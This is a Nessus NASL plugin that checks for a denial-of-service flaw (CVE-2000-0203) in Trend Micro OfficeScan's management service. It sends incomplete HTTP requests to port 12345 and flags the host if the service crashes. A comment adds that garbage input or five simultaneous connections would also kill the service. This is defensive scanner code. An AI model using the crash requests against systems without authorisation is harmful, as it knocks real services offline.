#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# GPL
#
# Status: untested
##
# http://online.securityfocus.com/bid/1013
#
# TBD:
# Sending garbage may also kill the service or make it eat 100% CPU
# Opening 5 connections while sending garbage will kill it


if(description)
{
 script_id(11059);
 script_bugtraq_id(1013);
 script_version("$Revision: 1.14 $");
 script_cve_id("CVE-2000-0203");
 script_name(english:"Trend Micro OfficeScan Denial of service");
 
 desc["english"] = "
It was possible to kill the Trend Micro OfficeScan 
antivirus management service by sending an incomplete 
HTTP request.

Solution : upgrade your software

Risk factor : Medium";

 desc["francais"] = "
Il a été possible de tuer le service d'administration
OfficeScan de Trend Micro en lui envoyant une requête
HTTP incomplète.

Solution : mettez à jour votre logiciel.

Facteur de risque : Moyen";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes OfficeScan";
 summary["francais"] = "Tue OfficeScan";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english: "This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes");
 script_require_ports("Services/www", 12345);
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("misc_func.inc");

function check(port)
{
 if (http_is_dead(port: port)) return (0);

 soc = http_open_socket(port);
 if(!soc)return(0);

 send(socket:soc, data: attack1);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 soc = http_open_socket(port);
 if(!soc) { security_warning(port); return(0); }

 send(socket:soc, data: attack2);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 if (http_is_dead(port: port)) security_warning(port);
}


 # get or GET?
 attack1 = string("get /  \r\n");
 attack2 = string("GET /  \r\n");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:12345);
foreach port (ports)
{
 check(port:port);
}

